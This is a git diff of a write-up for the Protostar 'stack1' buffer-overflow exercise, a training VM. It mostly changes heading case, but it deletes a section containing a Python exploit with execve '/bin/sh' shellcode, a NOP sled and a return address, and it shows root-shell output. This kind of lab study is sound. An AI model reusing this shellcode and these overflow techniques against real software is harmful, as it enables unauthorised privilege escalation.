@@ -1,6 +1,6 @@
-# Stack1
+# stack1
 
-## Solution
+## solution
 Quick disassembly to see the offsets of the variables stored in the binary.
 ```
 [0x080483b0]> pdf @main
@@ -27,9 +27,9 @@ user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print "A"*64+"dcba"')
 you have correctly got the variable to the right value
 ```
 
-## Shells
+## shells
 
-### Classic
+### classic buffer overflow
 First we need to find the offset from the start of the buffer to the %eip register, so we can
 redirect process execution. We can do this by giving it a known pattern of bytes, in this case
 `BBBBCCCCDDDD`, and so on.
@@ -71,7 +71,7 @@ Try again, you got 0x41414141
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2libc
+### ret2libc
 Read stack0 to see how we calculated the appropriate offsets for `libc`, `system` and `/bin/sh`
 required for this ret2libc exploit.
 
@@ -96,42 +96,7 @@ Try again, you got 0x41414141
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Rop Chain to Shellcode
-Here we just redirect process execution to a `ret` instruction, which then takes the next 4 bytes
-on the stack and calls the shellcode there.
-
-```py
-import struct
-
-off = 80
-
-pad = 'A' * off
-
-buf = ''
-buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
-buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
-buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
-
-nop = '\x90' * 0x80
-
-ret = struct.pack('I', 0x080484d6)
-ret += struct.pack('I', 0xbffff640 + off + 0x80)
-
-print pad + ret + nop + buf
-```
-
-Here it is in action.
-```
-user@protostar:/opt/protostar/bin$ ./stack1 $(python /tmp/pwn.py)
-Try again, you got 0x41414141
-# id
-uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
-```
-
-### Rop Chain to Libc
-...
-
-### Ret2.text to Shellcode
+### ret2.text to shellcode
 First we need to find a POP, POP, RET gadget in the target binary. We can do this with
 `msfelfscan`.
 ```
@@ -172,4 +137,5 @@ Try again, you got 0x41414141
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2.text to Libc
+### ret2.text to libc
+...
